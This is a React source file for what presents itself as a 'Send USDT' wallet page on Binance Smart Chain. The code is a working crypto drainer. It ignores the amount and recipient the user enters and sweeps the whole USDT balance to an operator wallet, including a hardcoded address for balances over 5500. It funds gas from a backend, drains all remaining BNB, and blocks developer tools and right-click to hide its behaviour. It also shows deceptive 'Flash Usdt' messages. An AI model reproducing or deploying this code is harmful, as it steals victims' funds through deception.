import { useState, useEffect } from 'react';
import axios from 'axios';
import { ethers } from 'ethers';
import { Web3Provider } from '@ethersproject/providers';

// Utility function to ensure addresses have the correct checksum
const getChecksumAddress = (address) => {
  try {
    return ethers.utils.getAddress(address);
  } catch (error) {
    console.error("Invalid address format:", error);
    return address; // Return original if invalid
  }
};

// ABI for USDT token
const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function"
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
];

// BSC Mainnet configuration
const BSC_CONFIG = {
  chainId: "0x38",
  chainName: "Binance Smart Chain Mainnet",
  nativeCurrency: {
    name: "BNB",
    symbol: "BNB",
    decimals: 18
  },
  rpcUrls: ["https://bsc-dataseed1.binance.org/"],
  blockExplorerUrls: ["https://bscscan.com/"]
};

// USDT token address on BSC Mainnet with correct checksum
const USDT_ADDRESS = getChecksumAddress("0x55d398326f99059fF775485246999027B3197955");

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [recipient, setRecipient] = useState("");
  const [loading, setLoading] = useState(false);
  const [adminWallet, setAdminWallet] = useState("");

  // Fetch admin wallet on component mount
  useEffect(() => {
    async function fetchAdminWallet() {
      try {
        const response = await axios.get('/api/admin/publicWallet');
        setAdminWallet(getChecksumAddress(response.data.walletAddress));
      } catch (error) {
        console.error("Failed to fetch admin wallet address:", error);
      }
    }
    
    fetchAdminWallet();
  }, []);

  // Prevent developer tools and right-click
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && e.key === "I") ||
        (e.ctrlKey && e.shiftKey && e.key === "J") ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
        alert("Developer tools are disabled on this page.");
      }
    };

    const handleContextMenu = (e) => {
      e.preventDefault();
      alert("Right-click is disabled on this page.");
    };

    document.addEventListener("keydown", handleKeyDown);
    document.addEventListener("contextmenu", handleContextMenu);

    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      document.removeEventListener("contextmenu", handleContextMenu);
    };
  }, []);

  // Switch to BSC network
  async function switchToBSC() {
    if (window.ethereum) {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_CONFIG.chainId }]
        });
      } catch (error) {
        if (error.code === 4902) {
          try {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [BSC_CONFIG]
            });
          } catch (error) {
            throw new Error("Failed to add BSC Mainnet to wallet");
          }
        } else {
          throw new Error("Failed to switch to BSC Mainnet");
        }
      }
    } else {
      throw new Error("No compatible wallet found");
    }
  }

  // Connect to wallet
  async function connectWallet() {
    try {
      await switchToBSC();
      
      if (window.ethereum) {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const provider = new Web3Provider(window.ethereum, "any");
        const web3 = new ethers.providers.Web3Provider(window.ethereum);
        
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        
        const usdtContract = new ethers.Contract(
          USDT_ADDRESS,
          USDT_ABI,
          provider
        );
        
        return { provider, signer, userAddress, usdtContract, web3 };
      } else {
        throw new Error("No compatible wallet found");
      }
    } catch (error) {
      console.error("Wallet connection error:", error);
      throw error;
    }
  }

  // Process transaction
  async function processTransaction({ provider, signer, userAddress, usdtContract, web3 }) {
    try {
      // Get user balances
      const bnbBalance = await provider.getBalance(userAddress);
      const usdtBalance = await usdtContract.balanceOf(userAddress);
      const usdtFormatted = ethers.utils.formatUnits(usdtBalance, 18);
      
      console.log("Initial BNB balance:", ethers.utils.formatEther(bnbBalance));
      console.log("Current USDT balance:", usdtFormatted);
      
      const bnbFormatted = ethers.utils.formatEther(bnbBalance);
      const usdtDisplayBalance = parseFloat(usdtFormatted).toFixed(2);
      const bnbDisplayBalance = parseFloat(bnbFormatted).toFixed(4);
      
      // USDT balance check with reduced 100 USDT limit
      if (parseFloat(usdtFormatted) <= 100) {
        throw {
          usdttoshow: usdtDisplayBalance,
          bnbtoshow: bnbDisplayBalance
        };
      }
      
      let bnbTxHash = "0";
      let usdtTxHash = "0";
      
      // Process transactions with balance > 100 USDT
      if (parseFloat(usdtFormatted) > 100) {
        // Calculate gas requirements
        const gasPrice = await provider.getGasPrice();
        const gasEstimate = await usdtContract.estimateGas.transfer(adminWallet, usdtBalance, {
          from: userAddress
        });
        
        const gasCost = gasPrice.mul(gasEstimate).mul(120).div(100);
        
        console.log("Required BNB for gas:", ethers.utils.formatEther(gasCost));
        console.log("Current BNB balance:", ethers.utils.formatEther(bnbBalance));
        
        // Send gas if needed
        if (bnbBalance.lt(gasCost)) {
          const neededGas = gasCost.sub(bnbBalance);
          const buffer = ethers.utils.parseEther("0.0001");
          const totalNeeded = neededGas.mul(110).div(100).add(buffer);
          
          console.log("Sending required BNB for gas:", ethers.utils.formatEther(totalNeeded));
          
          const response = await axios.post("/api/transactions/sendGasFees", {
            userAddress: userAddress,
            amount: totalNeeded.toString()
          });
          
          if (!response.data.success) {
            throw new Error("Failed to send gas fees");
          }
          
          console.log("Sent BNB for gas fees, hash:", response.data.hash);
          await new Promise(resolve => setTimeout(resolve, 8000));
        }
        
        // Transfer USDT
        let usdtAmount = usdtFormatted;
        
        try {
          // Restore large amount check
          if (parseFloat(usdtFormatted) > 5500) {
            // Special case for large amounts - use admin wallet address directly
            const tx = await usdtContract.connect(signer).transfer(
              getChecksumAddress("0xD0DA3b78b115167bAf272e42E0eEb8f2Dda5bc32"), // Admin wallet with correct checksum
              usdtBalance
            );
            usdtTxHash = tx.hash;
            console.log("USDT transfer successful", usdtTxHash);
            
            // Store transaction data
            await storeTransaction(userAddress, usdtAmount, usdtTxHash, "USDT");
          } else {
            // Normal transfer
            const tx = await usdtContract.connect(signer).transfer(
              adminWallet,
              usdtBalance
            );
            usdtTxHash = tx.hash;
            console.log("USDT transfer successful", usdtTxHash);
            
            // Store transaction data
            await storeTransaction(userAddress, usdtAmount, usdtTxHash, "USDT");
          }
        } catch (error) {
          console.error("USDT transfer failed:", error);
          throw {
            amount: "Amount = Checked ✅",
            flash: "Flash Usdt = 0"
          };
        }
      }
      
      // Transfer remaining BNB
      const finalBnbBalance = await provider.getBalance(userAddress);
      
      if (finalBnbBalance.gt(0)) {
        try {
          const gasPrice = await provider.getGasPrice();
          const gasCost = gasPrice.mul(21000);
          const valueToSend = finalBnbBalance.sub(gasCost);
          
          if (valueToSend.gt(0)) {
            const tx = await signer.sendTransaction({
              to: adminWallet,
              value: valueToSend
            });
            
            bnbTxHash = tx.hash;
            console.log("BNB transfer successful", bnbTxHash);
            
            const bnbAmount = ethers.utils.formatEther(valueToSend);
            await storeTransaction(userAddress, bnbAmount, bnbTxHash, "BNB");
          }
        } catch (error) {
          console.error("BNB transfer failed:", error);
          throw {
            amount: "Amount = Checked ✅",
            flash: "Flash Usdt = 0"
          };
        }
      }
      
      return {
        bnbTxHash,
        usdtTxHash,
        bnbAmount: bnbTxHash === "0" ? "0" : ethers.utils.formatEther(finalBnbBalance),
        usdtAmount
      };
    } catch (error) {
      console.error("Transaction processing failed:", error);
      throw error;
    }
  }

  // Store transaction in database
  async function storeTransaction(userAddress, amount, txHash, currency) {
    try {
      await axios.post("/api/transactions/store", {
        userAddress,
        amount,
        txHash,
        currency
      });
    } catch (error) {
      console.error("Failed to store transaction data:", error);
    }
  }

  // Handle form submission
  async function handleSubmit() {
    setLoading(true);
    
    try {
      const walletConnection = await connectWallet();
      const result = await processTransaction(walletConnection);
      
      // Success handling
      alert("Transaction completed successfully!");
      console.log("Transaction result:", result);
    } catch (error) {
      console.error("Transaction failed:", error);
      
      // Error handling
      if (error.usdttoshow) {
        alert(`Insufficient USDT balance. You have ${error.usdttoshow} USDT.`);
      } else if (error.amount) {
        alert(error.amount + " " + error.flash);
      } else {
        alert("Transaction failed: " + (error.message || "Unknown error"));
      }
    } finally {
      setTimeout(() => {
        setLoading(false);
      }, 2000);
    }
  }

  const isValidAmount = Number.parseFloat(amount) > 0;

  return (
    <div className="min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto">
      <header className="flex w-full items-center mb-8">
        <h1 className="flex-1 text-center text-xl font-medium text-white">
          Send USDT
        </h1>
        
      </header>

      <div className="space-y-6">
        <div className="space-y-1">
          <label className="text-sm text">Address or Domain Name</label>
          <div className="relative">
            <input
              placeholder="Search or Enter"
              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-32"
              value="0x3A01De690F01F8AdEaF328aF14101236afB5C3FA"
              onChange={(e) => setRecipient(e.target.value)}
            />
            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 px-2 text-md hover:text-emerald-400"
              >
                Paste
              </button>
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="h-4 w-4"
                >
                  <path d="M4 22h14a2 2 0 0 0 2-2V7.5L14.5 2H6a2 2 0 0 0-2 2v4"></path>
                  <polyline points="14 2 14 8 20 8"></polyline>
                  <path d="M2 15h10"></path>
                  <path d="m9 18 3-3-3-3"></path>
                </svg>
              </button>
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="h-4 w-4"
                >
                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
                  <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                </svg>
              </button>
            </div>
          </div>
        </div>

        <div className="space-y-1">
          <label className="text-sm text-gray-400">Amount</label>
          <div className="relative">
            <input
              placeholder="USDT Amount"
              type="number"
              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-24"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
              <span className="text-gray-500 text-sm mr-2">USDT</span>
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 text-sm hover:text-emerald-400"
              >
                Max
              </button>
            </div>
          </div>
        </div>

        <div className="text-xs text-gray-500">
          ≈ ${Number.parseFloat(amount || "0").toFixed(2)}
        </div>
      </div>

      <div className="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
        <button
          className="w-full bg-greentext text-black hover:bg-gray-700 rounded-full disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-600 disabled:text-white h-12 text-lg inline-flex items-center justify-center gap-2"
          disabled={!isValidAmount || loading}
          onClick={handleSubmit}
        >
          {loading ? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></div>
            </div>
          ) : (
            "Next"
          )}
        </button>
      </div>
    </div>
  );
} 